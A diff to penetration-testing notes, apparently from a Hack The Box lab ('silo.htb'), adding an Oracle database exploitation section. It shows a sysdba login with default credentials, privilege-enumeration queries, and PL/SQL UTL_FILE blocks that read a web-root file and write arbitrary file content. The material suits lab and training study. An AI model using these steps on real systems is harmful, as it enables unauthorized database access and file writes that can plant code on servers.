@@ -78,3 +78,52 @@ odat.py passwordguesser -s IP_ADD -d SID
 
 * All of the things discussed earlier can be done using a tool called **odat.**
 
+### **6. Exploitation:**
+
+With the gained creds, we can connect to the oracle database as **System Database Admin**(sysdba).
+
+```bash
+sqlplus scott/tiger@silo.htb/XE as sysdba
+```
+
+* **Checking session Privs:**
+
+```sql
+select * from session_privs;
+```
+
+* **Checking User Privs:**
+
+```sql
+select * from user_role_privs;
+```
+
+#### Reading/Writing files :
+
+**Example:**(READING FILE)
+
+```sql
+declare
+    l_file utl_file.file_type;
+    l_read varchar(200);
+begin
+    l_file := utl_file.fopen('/inetpub/wwwroot' ,'iisstart.htm','R');
+    utl_file.get_line (l_file, l_read);
+    utl_file.fclose (l_file);
+    dbms_output.put_line(l_read);
+end;
+```
+
+**Example:**(Writing File)
+
+```sql
+declare
+       l_file   UTL_FILE.file_type;
+begin
+   l_file := UTL_FILE.fopen (<DIR_PATH>, <FILE_NAME>, 'W');
+   UTL_FILE.put_line (l_file, '<FILE_CONTENT>');
+   UTL_FILE.fclose (l_file);
+end;
+
+```
+
